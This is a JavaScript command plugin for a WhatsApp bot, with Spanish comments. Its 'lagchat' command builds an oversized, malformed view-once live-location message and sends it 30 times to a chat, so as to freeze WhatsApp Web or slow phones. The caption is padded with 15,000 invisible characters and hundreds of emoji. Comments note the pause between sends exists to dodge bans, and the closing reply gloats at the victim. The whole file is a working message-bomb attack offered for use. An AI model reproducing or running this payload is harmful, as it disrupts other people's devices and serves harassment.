const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '💥',
        caption: '\u2063'.repeat(15000) + '💥'.repeat(300),
        sequenceNumber: '999',
        jpegThumbnail: '',
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          quotedMessage: {
            contactMessage: {
              displayName: '💣',
              vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:💣💣💣\nEND:VCARD'
            }
          },
          externalAdReply: {
            title: '💣 Lag WhatsApp',
            body: 'Este mensaje es muy pesado',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) throw '⛔ Solo el Owner puede usar este comando.'

  const jid = m.chat
  const times = 30 // Puedes subir a 50 o más bajo tu riesgo

  await m.reply(`⚠️ Enviando ${times} bombas al chat...\n❗ Esto puede trabar WhatsApp Web o móviles lentos.`)

  for (let i = 0; i < times; i++) {
    await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
    await new Promise(resolve => setTimeout(resolve, 200)) // Pequeña pausa para evitar ban instantáneo
  }

  await m.reply('✅ *Lagchat completo.* ¿Se te laggeó? 😈')
}

handler.command = /^lagchat$/i
handler.owner = true
handler.tags = ['owner']
handler.help = ['lagchat']

export default handler